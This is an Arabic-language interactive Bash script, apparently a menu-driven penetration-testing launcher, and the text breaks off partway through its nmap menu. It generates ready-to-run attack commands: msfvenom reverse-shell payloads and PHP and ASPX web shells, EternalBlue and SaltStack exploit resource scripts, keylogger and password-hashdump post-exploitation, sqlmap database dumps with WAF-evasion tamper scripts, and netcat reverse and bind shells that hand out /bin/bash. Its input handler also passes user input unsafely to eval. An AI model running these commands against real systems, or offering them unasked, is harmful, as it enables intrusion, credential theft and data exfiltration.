#!/bin/bash

# ألوان للواجهة
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # بدون لون

# متغيرات عامة
TARGET=""
PORT=""
DOMAIN=""
OUTPUT_FILE=""
LHOST=""
LPORT=""
PAYLOAD=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# دالة مسح الشاشة وعرض الترويسة
header() {
    clear
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}          مجموعة أدوات الاختبار الأمني الاحترافية          ${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}              Professional Penetration Testing Tools        ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# دالة الإدخال الآمن
read_input() {
    local prompt="$1"
    local var_name="$2"
    local is_password="$3"
    
    echo -ne "${GREEN}${prompt}: ${NC}"
    if [[ "$is_password" == "true" ]]; then
        read -s input
        echo
    else
        read input
    fi
    eval $var_name="'$input'"
}

# دالة التحقق من التثبيت
check_installed() {
    local tool="$1"
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}✗ $tool غير مثبت${NC}"
        return 1
    else
        echo -e "${GREEN}✓ $tool مثبت${NC}"
        return 0
    fi
}

# دالة تنفيذ الأمر مع التحقق
execute_command() {
    local cmd="$1"
    local require_sudo="$2"
    
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}الأمر المُنفذ:${NC}"
    echo -e "${WHITE}$cmd${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    # التحقق من الحاجة لصلاحيات root
    if [[ "$require_sudo" == "true" && $EUID -ne 0 ]]; then
        echo -e "${RED}⚠️ هذا الأمر يحتاج صلاحيات root${NC}"
        echo -e "${YELLOW}هل تريد تنفيذه بـ sudo؟ (y/n):${NC}"
        read confirm
        if [[ $confirm == "y" || $confirm == "Y" ]]; then
            cmd="sudo $cmd"
        else
            echo -e "${RED}تم إلغاء التنفيذ${NC}"
            echo -e "\n${PURPLE}اضغط Enter للمتابعة...${NC}"
            read
            return
        fi
    fi
    
    echo -e "${GREEN}هل تريد تنفيذ الأمر؟ (y/n):${NC}"
    read confirm
    if [[ $confirm == "y" || $confirm == "Y" ]]; then
        eval $cmd
    else
        echo -e "${RED}تم إلغاء التنفيذ${NC}"
    fi
    
    echo -e "\n${PURPLE}اضغط Enter للمتابعة...${NC}"
    read
}

# ═══════════════════════════════════════════════════════════
# METASPLOIT - إطار العمل الشامل
# ═══════════════════════════════════════════════════════════
metasploit_menu() {
    while true; do
        header
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║${WHITE}         Metasploit Framework           ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} تشغيل Metasploit Console"
        echo -e "${CYAN}[2]${NC} البحث عن Exploits"
        echo -e "${CYAN}[3]${NC} البحث عن Payloads"
        echo -e "${CYAN}[4]${NC} إنشاء Payload بسيط (msfvenom)"
        echo -e "${CYAN}[5]${NC} إنشاء Payload متقدم"
        echo -e "${CYAN}[6]${NC} تشغيل Listener تلقائي"
        echo -e "${CYAN}[7]${NC} استغلال Windows"
        echo -e "${CYAN}[8]${NC} استغلال Linux"
        echo -e "${CYAN}[9]${NC} استغلال تطبيقات الويب"
        echo -e "${CYAN}[10]${NC} Post-Exploitation Modules"
        echo -e "${CYAN}[11]${NC} إعداد Handler تلقائي"
        echo -e "${CYAN}[12]${NC} تشغيل مسح تلقائي"
        echo -e "${CYAN}[13]${NC} إدارة الجلسات (Sessions)"
        echo -e "${CYAN}[14]${NC} خيارات مخصصة متقدمة"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                CMD="msfconsole"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل كلمة للبحث عن Exploits (مثل: eternalblue)" SEARCH_TERM
                CMD="msfconsole -x \"search $SEARCH_TERM; exit\""
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل نوع النظام (windows/linux/android)" OS_TYPE
                CMD="msfvenom --list payloads | grep $OS_TYPE | head -20"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل نوع Payload (مثل: windows/meterpreter/reverse_tcp)" PAYLOAD
                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
                CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_FILE"
                execute_command "$CMD"
                ;;
            5)
                echo -e "${YELLOW}أنواع Payloads المتاحة:${NC}"
                echo "1) Windows Executable"
                echo "2) Linux ELF"
                echo "3) Android APK"
                echo "4) Python Script"
                echo "5) PHP Web Shell"
                echo "6) ASPX Web Shell"
                read_input "اختر النوع" PAYLOAD_TYPE
                
                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
                
                case $PAYLOAD_TYPE in
                    1)
                        CMD="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_FILE"
                        ;;
                    2)
                        CMD="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_FILE"
                        ;;
                    3)
                        CMD="msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
                        ;;
                    4)
                        CMD="msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
                        ;;
                    5)
                        CMD="msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
                        ;;
                    6)
                        CMD="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o $OUTPUT_FILE"
                        ;;
                esac
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
                read_input "أدخل نوع Payload (مثل: windows/meterpreter/reverse_tcp)" PAYLOAD
                
                # إنشاء سكريبت تلقائي لـ Metasploit
                SCRIPT_FILE="/tmp/metasploit_script.rc"
                echo "use exploit/multi/handler" > $SCRIPT_FILE
                echo "set PAYLOAD $PAYLOAD" >> $SCRIPT_FILE
                echo "set LHOST $LHOST" >> $SCRIPT_FILE
                echo "set LPORT $LPORT" >> $SCRIPT_FILE
                echo "set ExitOnSession false" >> $SCRIPT_FILE
                echo "exploit -j -z" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                echo -e "${CYAN}تم إنشاء سكريبت Metasploit تلقائي في: $SCRIPT_FILE${NC}"
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل عنوان الهدف (Windows)" TARGET
                read_input "أدخل اسم المستخدم (اختياري)" USERNAME
                read_input "أدخل كلمة المرور (اختياري)" PASSWORD
                
                SCRIPT_FILE="/tmp/windows_exploit.rc"
                echo "use exploit/windows/smb/ms17_010_eternalblue" > $SCRIPT_FILE
                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
                if [[ ! -z "$USERNAME" ]]; then
                    echo "set SMBUser $USERNAME" >> $SCRIPT_FILE
                fi
                if [[ ! -z "$PASSWORD" ]]; then
                    echo "set SMBPass $PASSWORD" >> $SCRIPT_FILE
                fi
                echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $SCRIPT_FILE
                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
                echo "set LPORT 4444" >> $SCRIPT_FILE
                echo "exploit" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            8)
                read_input "أدخل عنوان الهدف (Linux)" TARGET
                read_input "أدخل المنفذ الهدف" PORT
                
                SCRIPT_FILE="/tmp/linux_exploit.rc"
                echo "use exploit/linux/misc/saltstack_salt_unauth_rce" > $SCRIPT_FILE
                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
                echo "set RPORT $PORT" >> $SCRIPT_FILE
                echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> $SCRIPT_FILE
                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
                echo "set LPORT 4444" >> $SCRIPT_FILE
                echo "exploit" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل عنوان URL الهدف" TARGET
                read_input "أدخل نوع الثغرة (مثل: struts2/rest_xstream)" VULN_TYPE
                
                SCRIPT_FILE="/tmp/web_exploit.rc"
                echo "use exploit/multi/http/${VULN_TYPE}" > $SCRIPT_FILE
                echo "set RHOSTS $(echo $TARGET | cut -d'/' -f3)" >> $SCRIPT_FILE
                echo "set TARGETURI /" >> $SCRIPT_FILE
                echo "set PAYLOAD java/meterpreter/reverse_tcp" >> $SCRIPT_FILE
                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
                echo "set LPORT 4444" >> $SCRIPT_FILE
                echo "exploit" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            10)
                echo -e "${YELLOW}Post-Exploitation Modules:${NC}"
                echo "1) جمع المعلومات من الجلسة"
                echo "2) تصعيد الصلاحيات"
                echo "3) نقل الملفات"
                echo "4) keylogger"
                echo "5) dump passwords"
                read_input "اختر النوع" POST_TYPE
                
                SCRIPT_FILE="/tmp/post_exploit.rc"
                case $POST_TYPE in
                    1)
                        echo "run post/multi/gather/env" > $SCRIPT_FILE
                        echo "run post/multi/gather/checkvm" >> $SCRIPT_FILE
                        ;;
                    2)
                        echo "run post/multi/recon/local_exploit_suggester" > $SCRIPT_FILE
                        ;;
                    3)
                        read_input "أدخل المسار المحلي للملف" LOCAL_FILE
                        read_input "أدخل المسار الهدف" REMOTE_FILE
                        echo "upload $LOCAL_FILE $REMOTE_FILE" > $SCRIPT_FILE
                        ;;
                    4)
                        echo "run post/windows/capture/keylog" > $SCRIPT_FILE
                        ;;
                    5)
                        echo "run post/windows/gather/hashdump" > $SCRIPT_FILE
                        ;;
                esac
                echo "sessions -l" >> $SCRIPT_FILE
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            11)
                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
                read_input "أدخل نوع Payload" PAYLOAD
                
                echo -e "${CYAN}إنشاء Handler تلقائي...${NC}"
                echo "use exploit/multi/handler" > /tmp/handler.rc
                echo "set PAYLOAD $PAYLOAD" >> /tmp/handler.rc
                echo "set LHOST $LHOST" >> /tmp/handler.rc
                echo "set LPORT $LPORT" >> /tmp/handler.rc
                echo "set ExitOnSession false" >> /tmp/handler.rc
                echo "exploit -j" >> /tmp/handler.rc
                
                CMD="msfconsole -r /tmp/handler.rc"
                execute_command "$CMD"
                ;;
            12)
                read_input "أدخل عنوان الهدف" TARGET
                read_input "أدخل نطاق المنافذ (مثل: 1-1000)" PORTS
                
                SCRIPT_FILE="/tmp/auto_scan.rc"
                echo "use auxiliary/scanner/portscan/tcp" > $SCRIPT_FILE
                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
                echo "set PORTS $PORTS" >> $SCRIPT_FILE
                echo "run" >> $SCRIPT_FILE
                echo "use auxiliary/scanner/smb/smb_version" >> $SCRIPT_FILE
                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
                echo "run" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            13)
                echo -e "${YELLOW}إدارة الجلسات:${NC}"
                echo "1) عرض الجلسات النشطة"
                echo "2) التفاعل مع جلسة"
                echo "3) إنهاء جلسة"
                read_input "اختر الخيار" SESSION_OPT
                
                SCRIPT_FILE="/tmp/session_mgmt.rc"
                case $SESSION_OPT in
                    1)
                        echo "sessions -l" > $SCRIPT_FILE
                        ;;
                    2)
                        read_input "أدخل رقم الجلسة" SESSION_ID
                        echo "sessions -i $SESSION_ID" > $SCRIPT_FILE
                        ;;
                    3)
                        read_input "أدخل رقم الجلسة لإنهائها" SESSION_ID
                        echo "sessions -k $SESSION_ID" > $SCRIPT_FILE
                        ;;
                esac
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            14)
                read_input "أدخل اسم Module (مثل: exploit/windows/smb/...)" MODULE
                read_input "أدخل RHOSTS" RHOSTS
                read_input "أدخل RPORT (اختياري)" RPORT
                read_input "أدخل PAYLOAD" PAYLOAD
                read_input "أدخل LHOST" LHOST
                read_input "أدخل LPORT" LPORT
                
                SCRIPT_FILE="/tmp/custom_exploit.rc"
                echo "use $MODULE" > $SCRIPT_FILE
                echo "set RHOSTS $RHOSTS" >> $SCRIPT_FILE
                [[ ! -z "$RPORT" ]] && echo "set RPORT $RPORT" >> $SCRIPT_FILE
                echo "set PAYLOAD $PAYLOAD" >> $SCRIPT_FILE
                echo "set LHOST $LHOST" >> $SCRIPT_FILE
                echo "set LPORT $LPORT" >> $SCRIPT_FILE
                echo "exploit" >> $SCRIPT_FILE
                
                CMD="msfconsole -r $SCRIPT_FILE"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# SQLMAP - فحص ثغرات SQL
# ═══════════════════════════════════════════════════════════
sqlmap_menu() {
    while true; do
        header
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║${WHITE}           SQLMap - حقن SQL            ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} فحص أساسي على URL"
        echo -e "${CYAN}[2]${NC} فحص مع بيانات POST"
        echo -e "${CYAN}[3]${NC} استخراج قواعد البيانات (--dbs)"
        echo -e "${CYAN}[4]${NC} استخراج جداول قاعدة بيانات معينة"
        echo -e "${CYAN}[5]${NC} استخراج أعمدة جدول معين"
        echo -e "${CYAN}[6]${NC} استخراج بيانات جدول (dump)"
        echo -e "${CYAN}[7]${NC} فحص متقدم (Level 5, Risk 3)"
        echo -e "${CYAN}[8]${NC} فحص مع Tamper Scripts"
        echo -e "${CYAN}[9]${NC} فحص مع Cookie مخصص"
        echo -e "${CYAN}[10]${NC} خيارات مخصصة متقدمة"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل URL الهدف" TARGET
                CMD="sqlmap -u \"$TARGET\" --batch --random-agent"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل بيانات POST (مثل: username=admin&password=123)" POST_DATA
                CMD="sqlmap -u \"$TARGET\" --data=\"$POST_DATA\" --batch --random-agent"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل URL الهدف" TARGET
                CMD="sqlmap -u \"$TARGET\" --dbs --batch --random-agent"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل اسم قاعدة البيانات" DB_NAME
                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME --tables --batch --random-agent"
                execute_command "$CMD"
                ;;
            5)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل اسم قاعدة البيانات" DB_NAME
                read_input "أدخل اسم الجدول" TABLE_NAME
                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME -T $TABLE_NAME --columns --batch --random-agent"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل اسم قاعدة البيانات" DB_NAME
                read_input "أدخل اسم الجدول" TABLE_NAME
                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME -T $TABLE_NAME --dump --batch --random-agent"
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل URL الهدف" TARGET
                CMD="sqlmap -u \"$TARGET\" --level=5 --risk=3 --batch --random-agent --threads=10"
                execute_command "$CMD"
                ;;
            8)
                read_input "أدخل URL الهدف" TARGET
                echo -e "${YELLOW}Tamper Scripts الشائعة:${NC}"
                echo "1) space2comment  2) space2plus  3) between  4) charencode"
                read_input "أدخل اسم Tamper Script" TAMPER
                CMD="sqlmap -u \"$TARGET\" --tamper=$TAMPER --batch --random-agent"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل Cookie (مثل: PHPSESSID=abc123)" COOKIE
                CMD="sqlmap -u \"$TARGET\" --cookie=\"$COOKIE\" --batch --random-agent"
                execute_command "$CMD"
                ;;
            10)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل Level (1-5)" LEVEL
                read_input "أدخل Risk (1-3)" RISK
                read_input "أدخل عدد Threads" THREADS
                read_input "أدخل Technique (مثل: BEUSTQ)" TECHNIQUE
                CMD="sqlmap -u \"$TARGET\" --level=$LEVEL --risk=$RISK --threads=$THREADS --technique=$TECHNIQUE --batch --random-agent"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# AMASS - استكشاف النطاقات
# ═══════════════════════════════════════════════════════════
amass_menu() {
    while true; do
        header
        echo -e "${BLUE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${WHITE}      AMASS - استكشاف النطاقات        ${BLUE}║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} استكشاف سلبي (Passive Enumeration)"
        echo -e "${CYAN}[2]${NC} استكشاف نشط (Active Enumeration)"
        echo -e "${CYAN}[3]${NC} استكشاف مع القوة الغاشمة (Brute Force)"
        echo -e "${CYAN}[4]${NC} استكشاف شامل (Passive + Active + Brute)"
        echo -e "${CYAN}[5]${NC} استكشاف مع حفظ النتائج"
        echo -e "${CYAN}[6]${NC} استكشاف مع عرض عناوين IP"
        echo -e "${CYAN}[7]${NC} استخبارات النطاق (Intel Mode)"
        echo -e "${CYAN}[8]${NC} استكشاف متعدد النطاقات"
        echo -e "${CYAN}[9]${NC} استكشاف مع تحديد المصادر"
        echo -e "${CYAN}[10]${NC} خيارات مخصصة متقدمة"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل اسم النطاق (مثل: example.com)" DOMAIN
                CMD="amass enum -passive -d $DOMAIN"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل اسم النطاق" DOMAIN
                CMD="amass enum -active -d $DOMAIN"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل اسم النطاق" DOMAIN
                CMD="amass enum -brute -d $DOMAIN"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل اسم النطاق" DOMAIN
                CMD="amass enum -active -brute -d $DOMAIN"
                execute_command "$CMD"
                ;;
            5)
                read_input "أدخل اسم النطاق" DOMAIN
                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
                CMD="amass enum -passive -d $DOMAIN -o $OUTPUT_FILE"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل اسم النطاق" DOMAIN
                CMD="amass enum -passive -d $DOMAIN -ip"
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل اسم النطاق للاستخبارات" DOMAIN
                CMD="amass intel -d $DOMAIN"
                execute_command "$CMD"
                ;;
            8)
                echo -e "${YELLOW}أدخل النطاقات مفصولة بفواصل (مثل: site1.com,site2.com)${NC}"
                read_input "النطاقات" DOMAINS
                CMD="amass enum -passive -d $DOMAINS"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل اسم النطاق" DOMAIN
                echo -e "${YELLOW}المصادر المتاحة: crtsh,hackertarget,virustotal,etc${NC}"
                read_input "أدخل المصادر مفصولة بفواصل" SOURCES
                CMD="amass enum -passive -d $DOMAIN -src $SOURCES"
                execute_command "$CMD"
                ;;
            10)
                read_input "أدخل اسم النطاق" DOMAIN
                read_input "Timeout بالدقائق (0 للامحدود)" TIMEOUT
                read_input "أقصى عدد لاستعلامات DNS (0 للامحدود)" MAX_DNS
                CMD="amass enum -d $DOMAIN -timeout $TIMEOUT -max-dns-queries $MAX_DNS -active"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# NETCAT - أداة الشبكات
# ═══════════════════════════════════════════════════════════
netcat_menu() {
    while true; do
        header
        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║${WHITE}        NETCAT - أداة الشبكات          ${GREEN}║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} الاتصال بمنفذ (Connect)"
        echo -e "${CYAN}[2]${NC} الاستماع على منفذ (Listen)"
        echo -e "${CYAN}[3]${NC} فحص منفذ واحد"
        echo -e "${CYAN}[4]${NC} فحص نطاق منافذ"
        echo -e "${CYAN}[5]${NC} جلب Banner من خدمة"
        echo -e "${CYAN}[6]${NC} نقل ملف (الإرسال)"
        echo -e "${CYAN}[7]${NC} استقبال ملف"
        echo -e "${CYAN}[8]${NC} Reverse Shell - Listener"
        echo -e "${CYAN}[9]${NC} Reverse Shell - Connector"
        echo -e "${CYAN}[10]${NC} Bind Shell"
        echo -e "${CYAN}[11]${NC} UDP Connection"
        echo -e "${CYAN}[12]${NC} Chat بين جهازين"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل رقم المنفذ" PORT
                CMD="nc -v $TARGET $PORT"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل رقم المنفذ للاستماع عليه" PORT
                CMD="nc -lvp $PORT"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل رقم المنفذ" PORT
                CMD="nc -zv $TARGET $PORT"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل المنفذ الأول" PORT_START
                read_input "أدخل المنفذ الأخير" PORT_END
                CMD="nc -zv $TARGET $PORT_START-$PORT_END 2>&1 | grep succeeded"
                execute_command "$CMD"
                ;;
            5)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل رقم المنفذ" PORT
                CMD="echo \"\" | nc -v $TARGET $PORT"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل IP الجهاز المستقبل" TARGET
                read_input "أدخل رقم المنفذ" PORT
                read_input "أدخل مسار الملف المراد إرساله" FILE
                CMD="nc $TARGET $PORT < $FILE"
                echo -e "${YELLOW}تأكد من تشغيل: nc -lvp $PORT > received_file على الجهاز المستقبل${NC}"
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل رقم المنفذ للاستماع عليه" PORT
                read_input "أدخل اسم الملف للحفظ" FILE
                CMD="nc -lvp $PORT > $FILE"
                echo -e "${YELLOW}على الجهاز المرسل نفذ: nc <your_ip> $PORT < file_to_send${NC}"
                execute_command "$CMD"
                ;;
            8)
                read_input "أدخل رقم المنفذ للاستماع" PORT
                CMD="nc -lvp $PORT"
                echo -e "${YELLOW}على الجهاز الهدف نفذ: nc <your_ip> $PORT -e /bin/bash${NC}"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل IP المهاجم (Listener)" TARGET
                read_input "أدخل رقم المنفذ" PORT
                CMD="nc $TARGET $PORT -e /bin/bash"
                echo -e "${YELLOW}تأكد من تشغيل listener على: nc -lvp $PORT${NC}"
                execute_command "$CMD"
                ;;
            10)
                read_input "أدخل رقم المنفذ" PORT
                CMD="nc -lvp $PORT -e /bin/bash"
                echo -e "${YELLOW}للاتصال من جهاز آخر: nc <target_ip> $PORT${NC}"
                execute_command "$CMD"
                ;;
            11)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل رقم المنفذ" PORT
                CMD="nc -u $TARGET $PORT"
                execute_command "$CMD"
                ;;
            12)
                echo -e "${YELLOW}للدردشة بين جهازين:${NC}"
                echo -e "${CYAN}الجهاز الأول (Server): nc -lvp <port>${NC}"
                echo -e "${CYAN}الجهاز الثاني (Client): nc <ip> <port>${NC}"
                read_input "أدخل رقم المنفذ" PORT
                echo -e "${GREEN}[1] Server Mode  [2] Client Mode${NC}"
                read mode
                if [ "$mode" == "1" ]; then
                    CMD="nc -lvp $PORT"
                else
                    read_input "أدخل IP الخادم" TARGET
                    CMD="nc $TARGET $PORT"
                fi
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# NMAP - فحص الشبكات
# ═══════════════════════════════════════════════════════════
nmap_menu() {
    while true; do
        header
        echo -e "${PURPLE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║${WHITE}        NMAP - فحص الشبكات            ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} فحص سريع (Fast Scan)"
        echo -e "${CYAN}[2]${NC} فحص TCP SYN (-sS)"
        echo -e "${CYAN}[3]${NC} فحص TCP Connect (-sT)"
        echo -e "${CYAN}[4]${NC} فحص UDP (-sU)"
        echo -e "${CYAN}[5]${NC} كشف إصدارات الخدمات (-sV)"
        echo -e "${CYAN}[6]${NC} كشف نظام التشغيل (-O)"
        echo -e "${CYAN}[7]${NC} فحص شامل (-A)"
        echo -e "${CYAN}[8]${NC} فحص جميع المنافذ (1-65535)"
        echo -e "${CYAN}[9]${NC} فحص منافذ محددة"
        echo -e "${CYAN}[10]${NC} فحص أشهر 1000 منفذ"
        echo -e "${CYAN}[11]${NC} فحص الثغرات (NSE Vuln Scripts)"
        echo -e "${CYAN}[12]${NC} السكريبتات الافتراضية (-sC)"
        echo -e "${CYAN}[13]${NC} فحص بسرعات مختلفة (T0-T5)"
        echo -e "${CYAN}[14]${NC} فحص شبكة كاملة"
        echo -e "${CYAN}[15]${NC} كشف الأجهزة النشطة فقط"
        echo -e "${CYAN}[16]${NC} خيارات مخصصة متقدمة"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -F $TARGET"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="sudo nmap -sS $TARGET"
                execute_command "$CMD" "true"
                ;;
            3)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -sT $TARGET"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="sudo nmap -sU $TARGET"
                execute_command "$CMD" "true"
                ;;
            5)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -sV $TARGET"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="sudo nmap -O $TARGET"
                execute_command "$CMD" "true"
                ;;
            7)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="sudo nmap -A -T4 $TARGET"
                execute_command "$CMD" "true"
                ;;
            8)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -p- $TARGET"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "أدخل المنافذ (مثل: 80,443,8080 أو 1-1000)" PORTS
                CMD="nmap -p $PORTS $TARGET"
                execute_command "$CMD"
                ;;
            10)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap --top-ports 1000 $TARGET"
                execute_command "$CMD"
                ;;
            11)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap --script vuln $TARGET"
                execute_command "$CMD"
                ;;
            12)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -sC $TARGET"
                execute_command "$CMD"
                ;;
            13)
                read_input "أدخل IP/Hostname الهدف" TARGET
                echo -e "${YELLOW}اختر السرعة:${NC}"
                echo -e "${CYAN}[0] T0 Paranoid  [1] T1 Sneaky  [2] T2 Polite${NC}"
                echo -e "${CYAN}[3] T3 Normal    [4] T4 Aggressive  [5] T5 Insane${NC}"
                read_input "الرقم" TIMING
